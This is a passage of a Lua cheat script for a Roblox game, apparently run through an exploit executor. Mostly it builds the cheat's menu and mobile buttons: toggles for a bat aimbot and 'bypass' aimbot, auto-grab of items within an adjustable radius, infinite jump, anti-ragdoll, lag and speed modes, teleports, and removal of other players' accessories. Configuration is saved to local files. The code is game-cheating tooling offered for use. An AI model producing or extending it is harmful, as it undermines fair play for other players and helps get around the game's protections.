	clk.BackgroundTransparency = 1
	clk.Text = ""
	clk.ZIndex = 6
	clk.Active = true
	clk.Activated:Connect(function()
		if _anyKeyListening then return end
		State.laggerToggled = not State.laggerToggled
		if State.laggerToggled then State.speedToggled = false; if mobileSpeedSetActive then mobileSpeedSetActive(false) end end
		modeValLbl.Text = State.laggerToggled and "Lagger" or (State.speedToggled and "Carry" or "Normal")
		if mobileLaggerSetActive then mobileLaggerSetActive(State.laggerToggled) end
	end)
end

makeSecHeader("Bat Aimbot", "Bat Combat")

-- Auto Bat (original)
do
	local sv
	sv, _ = rowToggleKB("Bat Aimbot", "Auto Bat", nil, KB.AutoBat, false,
	function(on)
		State.autoBatToggled = on
		if on then
			if State.bypassToggled then
				State.bypassToggled = false
				stopBypassAimbot()
				if bypassSetVisual then bypassSetVisual(false) end
				if bypassBtn then updateBypassBtnAppearance(false) end
			end
			equipBat()
			startBatAimbot()
		else
			stopBatAimbot()
		end
	end,
	function(k) KB.AutoBat.kb = k end)
	autoBatSetVisual = sv
	setAutoBat = sv
end

-- Bypass Aimbot (nuevo)
do
	local sv
	sv, _ = rowToggleKB("Bat Aimbot", "Bypass Aimbot", nil, KB.Bypass, false,
	function(on)
		toggleBypass(on)
	end,
	function(k) KB.Bypass.kb = k end)
	bypassSetVisual = sv
	-- Aplicar estado inicial
	if bypassSetVisual then bypassSetVisual(State.bypassToggled) end
end

-- Botón para cambiar modo del bypass
do
	local c = baseCard("Bat Aimbot", 36)
	cLabel(c, "Bypass Mode", 8, 100, 10, TEXT_MAIN, Enum.Font.GothamBold)
	bypassModeBtn = Instance.new("TextButton", c)
	bypassModeBtn.Size = UDim2.new(0, 56, 0, 22)
	bypassModeBtn.Position = UDim2.new(1, -64, 0.5, -11)
	bypassModeBtn.BackgroundColor3 = INPUT_BG
	bypassModeBtn.BorderSizePixel = 0
	bypassModeBtn.Text = State.bypassMode == 1 and "Bypass" or "TP Bat"
	bypassModeBtn.TextColor3 = WHITE
	bypassModeBtn.Font = Enum.Font.GothamBold
	bypassModeBtn.TextSize = 10
	bypassModeBtn.ZIndex = 11
	Instance.new("UICorner", bypassModeBtn).CornerRadius = UDim.new(0, 4)
	Instance.new("UIStroke", bypassModeBtn).Color = BORDER2
	bypassModeBtn.Activated:Connect(function()
		toggleBypassMode()
		bypassModeBtn.Text = State.bypassMode == 1 and "Bypass" or "TP Bat"
	end)
end

-- Velocidad del bypass
do
	local c = baseCard("Bat Aimbot", 36)
	cLabel(c, "Bypass Speed", 8, 100, 10, TEXT_MAIN, Enum.Font.GothamBold)
	local box = Instance.new("TextBox", c)
	box.Size = UDim2.new(0, 56, 0, 22)
	box.Position = UDim2.new(1, -64, 0.5, -11)
	box.BackgroundColor3 = INPUT_BG
	box.BorderSizePixel = 0
	box.Text = tostring(State.bypassSpeed)
	box.TextColor3 = WHITE
	box.Font = Enum.Font.GothamBold
	box.TextSize = 10
	box.ClearTextOnFocus = false
	box.ZIndex = 11
	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
	local bs = Instance.new("UIStroke", box); bs.Color = BORDER2; bs.Thickness = 1
	box.Focused:Connect(function() TweenService:Create(bs, TweenInfo.new(0.1), {Color=WHITE}):Play() end)
	box.FocusLost:Connect(function()
		TweenService:Create(bs, TweenInfo.new(0.1), {Color=BORDER2}):Play()
		local n = tonumber(box.Text)
		if n and n>0 and n<=500 then
			State.bypassSpeed = n
		else
			box.Text = tostring(State.bypassSpeed)
		end
	end)
end

makeSecHeader("Mechanics", "Game Mechanics")
setAutoGrab = rowToggle("Mechanics", "Auto Grab", nil, false, function(on)
	Steal.AutoStealEnabled = on
	if on then
		stopAutoSteal()
		task.wait(0.1)
		startAutoSteal()
	else
		stopAutoSteal()
	end
end)

-- Radio de robo
do
	local c = baseCard("Mechanics", 36)
	cLabel(c, "Grab Radius", 8, 100, 10, TEXT_MAIN, Enum.Font.GothamBold)
	local radValBtn = Instance.new("TextButton", c)
	radValBtn.Size = UDim2.new(0, 56, 0, 22)
	radValBtn.Position = UDim2.new(1, -64, 0.5, -11)
	radValBtn.BackgroundColor3 = INPUT_BG
	radValBtn.BorderSizePixel = 0
	radValBtn.Text = tostring(Steal.StealRadius)
	radValBtn.TextColor3 = WHITE
	radValBtn.Font = Enum.Font.GothamBold
	radValBtn.TextSize = 10
	radValBtn.ZIndex = 11
	Instance.new("UICorner", radValBtn).CornerRadius = UDim.new(0, 4)
	Instance.new("UIStroke", radValBtn).Color = BORDER2
	local typing2 = false
	radValBtn.Activated:Connect(function()
		if typing2 then return end; typing2 = true
		local tb = Instance.new("TextBox", c)
		tb.Size = radValBtn.Size; tb.Position = radValBtn.Position
		tb.BackgroundColor3 = CARD_HOV; tb.BorderSizePixel = 0
		tb.Text = tostring(Steal.StealRadius)
		tb.TextColor3 = WHITE; tb.Font = Enum.Font.GothamBold; tb.TextSize = 10
		tb.ClearTextOnFocus = false; tb.ZIndex = 12
		Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 4)
		Instance.new("UIStroke", tb).Color = WHITE
		tb:CaptureFocus()
		tb.FocusLost:Connect(function()
			local num = tonumber(tb.Text)
			if num and num>=5 and num<=300 then
				Steal.StealRadius = math.floor(num)
				radValBtn.Text = tostring(Steal.StealRadius)
				progressRadLbl.Text = "Radius: "..Steal.StealRadius
			end
			tb:Destroy(); typing2 = false
		end)
	end)
end

setInfJump       = rowToggle("Mechanics", "Infinite Jump",  nil, false, function(on) State.infJumpEnabled = on end)
setHoldJump      = rowToggle("Mechanics", "Hold Jump",      nil, false, function(on) State.holdJumpEnabled = on end)
setAntiRag       = rowToggle("Mechanics", "Anti Ragdoll",   nil, false, function(on) State.antiRagdollEnabled=on; if on then startAntiRagdoll() else stopAntiRagdoll() end end)
setUnwalkToggle  = rowToggle("Mechanics", "Unwalk",         nil, false, function(on) State.unwalkEnabled=on; if on then startUnwalk() else stopUnwalk() end end)
setMedusaCounter = rowToggle("Mechanics", "Medusa Counter", nil, false, function(on) State.medusaCounterEnabled=on; if on then setupMedusaCounter(LP.Character) else stopMedusaCounter() end end)
setBatCounter    = rowToggle("Mechanics", "Bat Counter",    nil, false, function(on) State.batCounterEnabled=on; if on then startBatCounter() else stopBatCounter() end end)

makeSecHeader("Movement", "Movement & Teleport")
do
	local sv
	sv, _ = rowToggleKB("Movement", "Auto Left", nil, KB.AutoLeft, false,
	function(on)
		State.autoLeftEnabled = on
		if on then
			if State.autoRightEnabled then State.autoRightEnabled=false; if autoRightSetVisual then autoRightSetVisual(false) end; stopAutoRight() end
			if State.autoBatToggled then
				State.autoBatToggled=false
				stopBatAimbot()
				if autoBatSetVisual then autoBatSetVisual(false) end
			end
			if State.bypassToggled then
				State.bypassToggled=false
				stopBypassAimbot()
				if bypassSetVisual then bypassSetVisual(false) end
				if bypassBtn then updateBypassBtnAppearance(false) end
			end
			startAutoLeft()
		else stopAutoLeft() end
		if autoLeftSetVisual then autoLeftSetVisual(State.autoLeftEnabled) end
	end, function(k) KB.AutoLeft.kb=k end)
	autoLeftSetVisual = sv
end
do
	local sv
	sv, _ = rowToggleKB("Movement", "Auto Right", nil, KB.AutoRight, false,
	function(on)
		State.autoRightEnabled = on
		if on then
			if State.autoLeftEnabled then State.autoLeftEnabled=false; if autoLeftSetVisual then autoLeftSetVisual(false) end; stopAutoLeft() end
			if State.autoBatToggled then
				State.autoBatToggled=false
				stopBatAimbot()
				if autoBatSetVisual then autoBatSetVisual(false) end
			end
			if State.bypassToggled then
				State.bypassToggled=false
				stopBypassAimbot()
				if bypassSetVisual then bypassSetVisual(false) end
				if bypassBtn then updateBypassBtnAppearance(false) end
			end
			startAutoRight()
		else stopAutoRight() end
		if autoRightSetVisual then autoRightSetVisual(State.autoRightEnabled) end
	end, function(k) KB.AutoRight.kb=k end)
	autoRightSetVisual = sv
end
rowKBOnly("Movement", "Drop",    nil, KB.Drop,   function(k) KB.Drop.kb=k end)
rowKBOnly("Movement", "TP Down", nil, KB.TPDown, function(k) KB.TPDown.kb=k end)

do
	setAutoTPDownVisual = rowToggle("Movement", "Auto TP Down", nil, false, function(on)
		autoTPDownEnabled = on
		if on then startAutoTPDown() else stopAutoTPDown() end
	end)
	rowInput("Movement", "TP Down Height", nil, autoTPDownHeight, function(v)
		autoTPDownHeight = math.clamp(v, 0, 500)
	end)
end

rowActionBtn("Movement", "Insta Reset", function() insta_reset() end)

local medusaToggle = rowToggle("Movement", "Medusa Auto-Reset", nil, medusaResetEnabled, function(on)
    medusaResetEnabled = on
    if on then
        if LP.Character then setupMedusaWatcher(LP.Character) end
    else
        disconnectMedusaWatcher()
    end
end)

-- ── Stretch Rez ──────────────────────────────────────────────────────────
local stretchRezConn = nil
local function enableStretchRez()
	State.stretchRezEnabled = true
	workspace.CurrentCamera.FieldOfView = 120
	if stretchRezConn then stretchRezConn:Disconnect() end
	stretchRezConn = RunService.RenderStepped:Connect(function()
		if not State.stretchRezEnabled then stretchRezConn:Disconnect(); stretchRezConn = nil; return end
		workspace.CurrentCamera.FieldOfView = 120
	end)
end
local function disableStretchRez()
	State.stretchRezEnabled = false
	if stretchRezConn then stretchRezConn:Disconnect(); stretchRezConn = nil end
	workspace.CurrentCamera.FieldOfView = 70
end

-- ── Remove Accessories ───────────────────────────────────────────────────
local accessoryConn = nil
local function enableRemoveAccessories()
	State.removeAccessoriesEnabled = true
	for _, p in pairs(Players:GetPlayers()) do
		if p.Character then
			for _, obj in ipairs(p.Character:GetDescendants()) do
				if obj:IsA("Accessory") or obj:IsA("Hat") then pcall(function() obj:Destroy() end) end
			end
		end
	end
	if not accessoryConn then
		accessoryConn = Players.PlayerAdded:Connect(function(player)
			player.CharacterAdded:Connect(function(char)
				task.wait(0.5)
				if not State.removeAccessoriesEnabled then return end
				for _, obj in ipairs(char:GetDescendants()) do
					if obj:IsA("Accessory") or obj:IsA("Hat") then pcall(function() obj:Destroy() end) end
				end
			end)
		end)
	end
end
local function disableRemoveAccessories()
	State.removeAccessoriesEnabled = false
	if accessoryConn then accessoryConn:Disconnect(); accessoryConn = nil end
end

-- ── Dark Mode ───────────────────────────────────────────────────────────
local _darkEnabled = false
local _defBrightness = game:GetService("Lighting").Brightness
local _defClock = game:GetService("Lighting").ClockTime
local _defAmbient = game:GetService("Lighting").OutdoorAmbient
local function enableDarkMode()
	_darkEnabled = true; State.darkModeEnabled = true
	local Lighting = game:GetService("Lighting")
	local sky = Lighting:FindFirstChild("GalaxySky") or Instance.new("Sky")
	sky.Name = "GalaxySky"
	sky.SkyboxBk = "rbxassetid://159454299"
	sky.SkyboxDn = "rbxassetid://159454296"
	sky.SkyboxFt = "rbxassetid://159454293"
	sky.SkyboxLf = "rbxassetid://159454286"
	sky.SkyboxRt = "rbxassetid://159454289"
	sky.SkyboxUp = "rbxassetid://159454291"
	sky.Parent = Lighting
	Lighting.Brightness = 0
	Lighting.ClockTime = 0
	Lighting.ExposureCompensation = -2
	Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
end
local function disableDarkMode()
	_darkEnabled = false; State.darkModeEnabled = false
	local Lighting = game:GetService("Lighting")
	local sky = Lighting:FindFirstChild("GalaxySky")
	if sky then sky:Destroy() end
	Lighting.Brightness = _defBrightness
	Lighting.ClockTime = _defClock
	Lighting.ExposureCompensation = 0
	Lighting.OutdoorAmbient = _defAmbient
end

-- ── Performance Tab UI ───────────────────────────────────────────────────
makeSecHeader("Performance", "Performance")

do
	local _Lighting = game:GetService("Lighting")
	local _antiLagConn = nil

	local function applyAntiLag(instance)
		if instance:IsA("ParticleEmitter") then
			instance.Enabled = false
		elseif instance:IsA("Decal") then
			instance.Transparency = 1
		elseif instance:IsA("BasePart") then
			instance.Material = Enum.Material.Plastic
			instance.Reflectance = 0
			instance.CastShadow = false
		end
	end

	local function optimizeLighting()
		_Lighting.GlobalShadows = false
		_Lighting.FogEnd = 9e9
		_Lighting.Brightness = 1
		_Lighting.EnvironmentDiffuseScale = 0
		_Lighting.EnvironmentSpecularScale = 0
		for _, child in pairs(_Lighting:GetChildren()) do
			if child:IsA("BloomEffect") or child:IsA("BlurEffect") or child:IsA("SunRaysEffect") then
				child.Enabled = false
			end
		end
	end

	local function enableAntiLag()
		optimizeLighting()
		for _, desc in pairs(workspace:GetDescendants()) do
			applyAntiLag(desc)
			if desc:IsA("Accessory") then desc:Destroy() end
		end
		if _antiLagConn then _antiLagConn:Disconnect() end
		_antiLagConn = workspace.DescendantAdded:Connect(function(desc)
			applyAntiLag(desc)
			if desc:IsA("Accessory") then desc:Destroy() end
		end)
	end

	local function disableAntiLag()
		if _antiLagConn then _antiLagConn:Disconnect(); _antiLagConn = nil end
	end

	setAntiLag = function(on)
		State.antiLagEnabled = on
		if on then enableAntiLag() else disableAntiLag() end
	end
	local setAntiLagVisual = rowToggle("Performance", "Anti Lag", nil, false, function(on) setAntiLag(on) end)
	local _origSetAntiLag = setAntiLag
	setAntiLag = function(on) setAntiLagVisual(on); _origSetAntiLag(on) end
end

setStretchRez = function(on) if on then enableStretchRez() else disableStretchRez() end end
local setStretchRezVisual = rowToggle("Performance", "Stretch Rez", nil, false, function(on) setStretchRez(on) end)
local _origStretchRez = setStretchRez
setStretchRez = function(on) setStretchRezVisual(on); _origStretchRez(on) end

setRemoveAccessories = function(on) if on then enableRemoveAccessories() else disableRemoveAccessories() end end
local setRemoveAccVisual = rowToggle("Performance", "Remove Accessories", nil, false, function(on) setRemoveAccessories(on) end)
local _origRemoveAcc = setRemoveAccessories
setRemoveAccessories = function(on) setRemoveAccVisual(on); _origRemoveAcc(on) end

setDarkMode = function(on) if on then enableDarkMode() else disableDarkMode() end end
local setDarkModeVisual = rowToggle("Performance", "Dark Mode", nil, false, function(on) setDarkMode(on) end)
local _origDarkMode = setDarkMode
setDarkMode = function(on) setDarkModeVisual(on); _origDarkMode(on) end

-- ===== NUEVO: Tryhard Animation (extraído del segundo script) =====
local tryhardVisual = rowToggle("Performance", "Tryhard Animation", nil, State.tryardAnimEnabled, function(on)
    State.tryardAnimEnabled = on
    if on then
        startTryardAnim()
    else
        stopTryardAnim()
    end
    pcall(saveConfig)
end)

makeSecHeader("Settings", "Interface & Binds")

setIntroToggle = rowToggle("Settings", "Play Intro", nil, State.introEnabled, function(on)
	State.introEnabled = on
	pcall(saveConfig)
end)

uiScaleBox = rowInput("Settings", "UI Scale", nil, uiScaleValue, function(v)
	local n = math.clamp(math.floor(v + 0.5), 50, 150)
	uiScaleValue = n
	if mainUIScale then mainUIScale.Scale = n / 100 end
	pcall(saveConfig)
end)
rowKBOnly("Settings", "Hide / Show GUI", nil, KB.GuiHide, function(k) KB.GuiHide.kb=k end)
setLockUIVisual = rowToggle("Settings", "Lock UI", nil, false, function(on)
	uiLocked = on
	autoSavePositions()
end)
local saveBtn; saveBtn = rowActionBtn("Settings", "Save Config", function()
	if saveConfig then
		pcall(function() saveConfig(saveBtn) end)
		if saveBtn then
			local prev = saveBtn.Text
			saveBtn.Text = "✓ Saved!"
			task.delay(1.5, function() if saveBtn and saveBtn.Parent then saveBtn.Text = prev end end)
		end
	end
end)
rowActionBtn("Settings", "Reset Mobile Buttons", function()
	if resetMobileButtons then resetMobileButtons() end
end)

end -- tab content scope

-- ==================== MOBILE PANEL (Colores azules) ====================
do
	local BTN_SIZE = 58
	local BTN_GAP  = 14
	local PADDING  = 6
	local COLS     = 2
	local ROWS     = 4
	local PANEL_W  = PADDING * 2 + COLS * BTN_SIZE + (COLS - 1) * BTN_GAP
	local PANEL_H  = PADDING * 2 + ROWS * BTN_SIZE + (ROWS - 1) * BTN_GAP

	MobilePanel = Instance.new("Frame")
	MobilePanel.Name = "MobileButtonsPanel"
	MobilePanel.Size = UDim2.new(0, PANEL_W, 0, PANEL_H)
	MobilePanel.Position = UDim2.new(1, -(PANEL_W + 20), 1, -(PANEL_H + 20))
	MobilePanel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	MobilePanel.BackgroundTransparency = 1
	MobilePanel.BorderSizePixel = 0
	MobilePanel.ZIndex = 95
	MobilePanel.Parent = gui

	makeDraggable(MobilePanel)
	MobilePanel.InputEnded:Connect(function(inp)
		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
			task.defer(function() pcall(saveConfig) end)
		end
	end)

	resetMobileButtons = function()
		MobilePanel.Position = UDim2.new(1, -(PANEL_W + 20), 1, -(PANEL_H + 20))
		task.defer(function() pcall(saveConfig) end)
	end

	local function createMobileButton(name, displayText, col, row, isToggle, onAction)
		local xPos = PADDING + col * (BTN_SIZE + BTN_GAP)
		local yPos = PADDING + row * (BTN_SIZE + BTN_GAP)

		local btn = Instance.new("TextButton")
		btn.Name = "Btn_" .. name
		btn.Size = UDim2.new(0, BTN_SIZE, 0, BTN_SIZE)
		btn.Position = UDim2.new(0, xPos, 0, yPos)
		btn.BackgroundColor3 = Q_OFF
		btn.Text = displayText
		btn.TextColor3 = Q_TEXT_OFF
		btn.TextScaled = false; btn.TextSize = 11
		btn.Font = Enum.Font.GothamBold
		btn.TextWrapped = true; btn.LineHeight = 1.2
		btn.BorderSizePixel = 0; btn.AutoButtonColor = false
		btn.ZIndex = 99
		btn.Parent = MobilePanel
		Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
		local stroke = Instance.new("UIStroke", btn)
		stroke.Color = Q_BORDER
		stroke.Thickness = 1.5

		local isOn = false
		local function setter(s)
			isOn = s
			TweenService:Create(btn, TweenInfo.new(0.15), {
				BackgroundColor3 = s and Q_ON or Q_OFF,
				TextColor3       = s and Q_TEXT_ON or Q_TEXT_OFF,
			}):Play()
			TweenService:Create(stroke, TweenInfo.new(0.15), {
				Color = s and Q_BORDER_ON or Q_BORDER
			}):Play()
		end

		local function flash()
			TweenService:Create(btn, TweenInfo.new(0.08), {BackgroundColor3=Q_ON, TextColor3=Q_TEXT_ON}):Play()
			TweenService:Create(stroke, TweenInfo.new(0.08), {Color=Q_BORDER_ON}):Play()
			task.delay(0.22, function()
				TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3=Q_OFF, TextColor3=Q_TEXT_OFF}):Play()
				TweenService:Create(stroke, TweenInfo.new(0.15), {Color=Q_BORDER}):Play()
			end)
		end

		btn.Activated:Connect(function()
			if isToggle then
				isOn = not isOn; setter(isOn)
				if onAction then onAction(isOn) end
			else
				flash()
				if onAction then onAction() end
			end
		end)

		return btn, setter
	end

	createMobileButton("Drop", "DROP\nBR", 0, 0, false, function() task.spawn(runDrop) end)

	local _, saAL = createMobileButton("AutoLeft", "AUTO\nLEFT", 1, 0, true, function(on)
		State.autoLeftEnabled = on
		if on then
			if State.autoRightEnabled then State.autoRightEnabled=false; if autoRightSetVisual then autoRightSetVisual(false) end; stopAutoRight() end
			if State.autoBatToggled then
				State.autoBatToggled=false
				stopBatAimbot()
				if autoBatSetVisual then autoBatSetVisual(false) end
			end
			if State.bypassToggled then
				State.bypassToggled=false
				stopBypassAimbot()
				if bypassSetVisual then bypassSetVisual(false) end
				if bypassBtn then updateBypassBtnAppearance(false) end
			end
			startAutoLeft()
		else stopAutoLeft() end
		if autoLeftSetVisual then autoLeftSetVisual(State.autoLeftEnabled) end
	end)
	autoLeftSetVisual = function(on) saAL(on) end

	local _, saAB = createMobileButton("AutoBat", "BAT\nAIMBOT", 0, 1, true, function(on)
		State.autoBatToggled = on
		if on then
			if State.bypassToggled then
				State.bypassToggled=false
				stopBypassAimbot()
				if bypassSetVisual then bypassSetVisual(false) end
				if bypassBtn then updateBypassBtnAppearance(false) end
			end
			equipBat()
			startBatAimbot()
		else
			stopBatAimbot()
		end
	end)
	autoBatSetVisual = function(on) saAB(on); if setAutoBat then setAutoBat(on) end end

	local _, saAR = createMobileButton("AutoRight", "AUTO\nRIGHT", 1, 1, true, function(on)
		State.autoRightEnabled = on
		if on then
			if State.autoLeftEnabled then State.autoLeftEnabled=false; if autoLeftSetVisual then autoLeftSetVisual(false) end; stopAutoLeft() end
			if State.autoBatToggled then
				State.autoBatToggled=false
				stopBatAimbot()
				if autoBatSetVisual then autoBatSetVisual(false) end
			end
			if State.bypassToggled then
				State.bypassToggled=false
				stopBypassAimbot()
				if bypassSetVisual then bypassSetVisual(false) end
				if bypassBtn then updateBypassBtnAppearance(false) end
			end
			startAutoRight()
		else stopAutoRight() end
		if autoRightSetVisual then autoRightSetVisual(State.autoRightEnabled) end
	end)
	autoRightSetVisual = function(on) saAR(on) end

	createMobileButton("TPDown", "TP\nDOWN", 0, 2, false, function() task.spawn(runTPDown) end)

	local _, saCS = createMobileButton("Speed", "CARRY\nSPD", 1, 2, true, function(on)
		State.speedToggled = on; State.laggerToggled = false; laggerPhase = 0
		if mobileLaggerSetActive then mobileLaggerSetActive(false) end
		if modeValLbl then modeValLbl.Text = on and "Carry" or "Normal" end
	end)
	mobileSpeedSetActive = function(on) saCS(on) end

	local saLC
	local _, saLM = createMobileButton("Lagger", "LAGGER\nMODE", 1, 3, true, function(on)
		State.laggerToggled = on; laggerPhase = on and 1 or 0
		if on then
			State.speedToggled = false
			if mobileSpeedSetActive then mobileSpeedSetActive(false) end
			saLC(false)
			if modeValLbl then modeValLbl.Text = "Lagger" end
		else
			laggerPhase = 0
			if modeValLbl then modeValLbl.Text = "Normal" end
		end
	end)
	mobileLaggerSetActive = function(on) saLM(on); if not on then laggerPhase = 0 end end

	_, saLC = createMobileButton("LaggerCarry", "LAGGER\nCARRY", 0, 3, true, function(on)
		State.laggerToggled = on; laggerPhase = on and 2 or 0
		if on then
			State.speedToggled = false
			if mobileSpeedSetActive then mobileSpeedSetActive(false) end
			saLM(false)
			if modeValLbl then modeValLbl.Text = "Lagger Carry" end
		else
			laggerPhase = 0
			if modeValLbl then modeValLbl.Text = "Normal" end
		end
	end)
	mobileLaggerCarrySetActive = function(on) saLC(on) end

	mobileBtnActive.AutoLeft  = saAL
	mobileBtnActive.AutoRight = saAR
	mobileBtnActive.AutoBat   = saAB
end

-- ─── Botón flotante para Bypass Aimbot (ahora "BAT OP") ──────────────────
local function updateBypassBtnAppearance(on)
    if not bypassBtn then return end
    bypassBtn.BackgroundColor3 = on and Q_ON or Q_OFF
    bypassBtn.TextColor3 = on and Q_TEXT_ON or Q_TEXT_OFF
    if bypassBtn and bypassBtn:FindFirstChild("UIStroke") then
        bypassBtn:FindFirstChild("UIStroke").Color = on and Q_BORDER_ON or Q_BORDER
    end
end

-- Crear el botón flotante para Bypass (ahora etiquetado como "BAT OP")
bypassBtn = Instance.new("TextButton", gui)
bypassBtn.Name = "BypassBtn"
bypassBtn.Size = UDim2.new(0, 58, 0, 58)
bypassBtn.Position = UDim2.new(0, 240, 0, 50)  -- Posición inicial
bypassBtn.BackgroundColor3 = Q_OFF
bypassBtn.BorderSizePixel = 0
bypassBtn.Text = "BAT OP"
bypassBtn.TextColor3 = Q_TEXT_OFF
bypassBtn.Font = Enum.Font.GothamBold
bypassBtn.TextSize = 11
bypassBtn.TextWrapped = true
bypassBtn.TextXAlignment = Enum.TextXAlignment.Center
bypassBtn.TextYAlignment = Enum.TextYAlignment.Center
bypassBtn.ZIndex = 200
bypassBtn.Visible = true
Instance.new("UICorner", bypassBtn).CornerRadius = UDim.new(0, 12)
local bypassStroke = Instance.new("UIStroke", bypassBtn)
bypassStroke.Color = Q_BORDER
bypassStroke.Thickness = 1.5

local function loadBypassPos()
	local file = "kskopBypassPos.json"
	if not isfile(file) then return end
	local content = readfile(file)
	if not content then return end
	local data = HttpService:JSONDecode(content)
	if data then
		bypassBtn.Position = UDim2.new(data.XScale or 0, data.XOffset or 240, data.YScale or 0, data.YOffset or 50)
	end
end

local function saveBypassPos()
	local pos = bypassBtn.Position
	local data = { XScale = pos.X.Scale, XOffset = pos.X.Offset, YScale = pos.Y.Scale, YOffset = pos.Y.Offset }
	local encoded = HttpService:JSONEncode(data)
	writefile("kskopBypassPos.json", encoded)
end

makeDraggable(bypassBtn)
bypassBtn.InputEnded:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
		saveBypassPos()
	end
end)

loadBypassPos()
updateBypassBtnAppearance(State.bypassToggled)

bypassBtn.MouseButton1Click:Connect(function()
	local newState = not State.bypassToggled
	toggleBypass(newState)
	updateBypassBtnAppearance(newState)
	saveConfig()
end)

-- ─── Botón flotante para Instant Reset (nuevo) ──────────────────────────
resetBtn = Instance.new("TextButton", gui)
resetBtn.Name = "ResetBtn"
resetBtn.Size = UDim2.new(0, 58, 0, 58)
resetBtn.Position = UDim2.new(0, 180, 0, 50)  -- Posición inicial
resetBtn.BackgroundColor3 = Q_OFF
resetBtn.BorderSizePixel = 0
resetBtn.Text = "RESET"
resetBtn.TextColor3 = Q_TEXT_OFF
resetBtn.Font = Enum.Font.GothamBold
resetBtn.TextSize = 11
resetBtn.TextWrapped = true
resetBtn.TextXAlignment = Enum.TextXAlignment.Center
resetBtn.TextYAlignment = Enum.TextYAlignment.Center
resetBtn.ZIndex = 200
resetBtn.Visible = true
Instance.new("UICorner", resetBtn).CornerRadius = UDim.new(0, 12)
local resetStroke = Instance.new("UIStroke", resetBtn)
resetStroke.Color = Q_BORDER
resetStroke.Thickness = 1.5

local function loadResetPos()
    local file = "kskopResetPos.json"
    if not isfile(file) then return end
    local content = readfile(file)
    if not content then return end
    local data = HttpService:JSONDecode(content)
    if data then
        resetBtn.Position = UDim2.new(data.XScale or 0, data.XOffset or 180, data.YScale or 0, data.YOffset or 50)
    end
end

local function saveResetPos()
    local pos = resetBtn.Position
    local data = { XScale = pos.X.Scale, XOffset = pos.X.Offset, YScale = pos.Y.Scale, YOffset = pos.Y.Offset }
    local encoded = HttpService:JSONEncode(data)
    writefile("kskopResetPos.json", encoded)
end

makeDraggable(resetBtn)
resetBtn.InputEnded:Connect(function(inp)
    if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
        saveResetPos()
    end
end)

loadResetPos()

resetBtn.MouseButton1Click:Connect(function()
    insta_reset()
    -- Efecto flash similar a los botones de acción del panel móvil
    TweenService:Create(resetBtn, TweenInfo.new(0.08), {BackgroundColor3=Q_ON, TextColor3=Q_TEXT_ON}):Play()
    TweenService:Create(resetStroke, TweenInfo.new(0.08), {Color=Q_BORDER_ON}):Play()
    task.delay(0.22, function()
        TweenService:Create(resetBtn, TweenInfo.new(0.15), {BackgroundColor3=Q_OFF, TextColor3=Q_TEXT_OFF}):Play()
        TweenService:Create(resetStroke, TweenInfo.new(0.15), {Color=Q_BORDER}):Play()
    end)
end)

-- ─── Funciones de guardado/carga ──────────────────────────────────────────
saveConfig = function(btn)
	local function ks(e) return {kb=e.kb and e.kb.Name or nil, gp=e.gp and e.gp.Name or nil} end
	local function sp(f) if not f then return nil end; local p=f.Position; return {xs=p.X.Scale,xo=p.X.Offset,ys=p.Y.Scale,yo=p.Y.Offset} end
	local cfg = {
		normalSpeed=NS, carrySpeed=CS, laggerSpeed=LS,
		introEnabled=State.introEnabled,
		selectedIntroMusic=State.selectedIntroMusic,
		autoLeftKey=ks(KB.AutoLeft), autoRightKey=ks(KB.AutoRight),
		dropKey=ks(KB.Drop), tpDownKey=ks(KB.TPDown),
		autoBatKey=ks(KB.AutoBat), speedKey=ks(KB.Speed), guiHideKey=ks(KB.GuiHide),
		laggerKey=ks(KB.Lagger),
		bypassKey=ks(KB.Bypass),
		grabRadius=Steal.StealRadius,
		infJump=State.infJumpEnabled,
		holdJump=State.holdJumpEnabled,
		antiRagdoll=State.antiRagdollEnabled,
		unwalkEnabled=State.unwalkEnabled,
		laggerMode=State.laggerToggled, uiLocked=uiLocked,
		autoBatToggled=State.autoBatToggled,
		bypassToggled=State.bypassToggled,
		bypassMode=State.bypassMode,
		bypassSpeed=State.bypassSpeed,
		medusaResetEnabled=medusaResetEnabled,
		tryardAnimEnabled=State.tryardAnimEnabled,
		mainPos=sp(main), miniPos=sp(mini), panelPos=sp(MobilePanel), pbPos=sp(pbFrame),
		bypassPos=sp(bypassBtn),
		resetPos=sp(resetBtn),
	}
	local ok = pcall(function()
		local encoded = HttpService:JSONEncode(cfg)
		if writefile then writefile("KSKOPConfig.json", encoded) end
	end)
	if not ok then
		pcall(function()
			local encoded = HttpService:JSONEncode(cfg)
			if _writefile then _writefile("KSKOPConfig.json", encoded) end
		end)
	end
	if btn then
		local prev = btn.Text
		btn.Text = ok and "✓  Saved!" or "✕  Failed!"
		task.wait(1.5); btn.Text = prev
	end
end

-- ============================================================
-- ══ ANTI-RAGDOLL (sin cambios) ══
-- ============================================================
ANTI_RAGDOLL = {
    enabled = false,
    connections = {},
    cachedCharData = {}
}

local function disconnectAllAntiRagdoll()
    for _, conn in ipairs(ANTI_RAGDOLL.connections) do
        pcall(function() conn:Disconnect() end)
    end
    ANTI_RAGDOLL.connections = {}
end

local function cacheCharacterData()
    local char = LP.Character
    if not char then return false end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root then return false end
    ANTI_RAGDOLL.cachedCharData = {
        character = char,
        humanoid = hum,
        root = root,
        originalWalkSpeed = hum.WalkSpeed,
        originalJumpPower = hum.JumpPower,
        isFrozen = false
    }
    return true
end

local function isRagdolled()
    if not ANTI_RAGDOLL.cachedCharData.humanoid then return false end
    local hum = ANTI_RAGDOLL.cachedCharData.humanoid
    local state = hum:GetState()
    local ragdollStates = {
        [Enum.HumanoidStateType.Physics] = true,
        [Enum.HumanoidStateType.Ragdoll] = true,
        [Enum.HumanoidStateType.FallingDown] = true
    }
    if ragdollStates[state] then return true end
    local endTime = LP:GetAttribute("RagdollEndTime")
    if endTime then
        local now = workspace:GetServerTimeNow()
